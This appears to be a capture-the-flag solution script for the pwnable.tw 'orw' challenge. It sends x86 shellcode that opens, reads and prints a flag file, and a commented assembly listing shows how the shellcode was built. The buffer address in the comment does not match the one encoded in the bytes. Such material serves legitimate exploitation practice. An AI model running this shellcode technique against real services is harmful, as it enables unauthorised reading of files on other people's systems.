from pwn import *

shellcode = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x68\x61\x67\x00\x00\x68\x77\x2f\x66\x6c\x68\x65\x2f\x6f\x72\x68\x2f\x68\x6f\x6d\x89\xe3\xb8\x05\x00\x00\x00\xcd\x80\x89\xc3\xb9\x60\xa0\x04\x08\xba\x30\x00\x00\x00\xb8\x03\x00\x00\x00\xcd\x80\x89\xc2\xbb\x01\x00\x00\x00\xb8\x04\x00\x00\x00\xcd\x80"
s = remote("chall.pwnable.tw", 10001)
_ = s.recv()
s.send(shellcode)
print s.recv()
s.close()

'''
# This is the original asm code to convert to shellcode
BITS 32
xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx
push 00006761h
push 6c662f77h
push 726f2f65h
push 6d6f682fh
mov ebx, esp  ; pathname
mov eax, 0x5  ; open()
int 80h
mov ebx, eax  ; fd
mov ecx, 0x80486a0  ; 0x80486a0 is the address of shellcode variable, if ASLR is enable we should use esp instead
mov edx, 30h  ; count
mov eax, 3h   ; read() 
int 80h
mov edx, eax  ; count 
mov ebx, 0x1  ; fd --> stdout
mov eax, 4h   ; write()
int 80h
'''
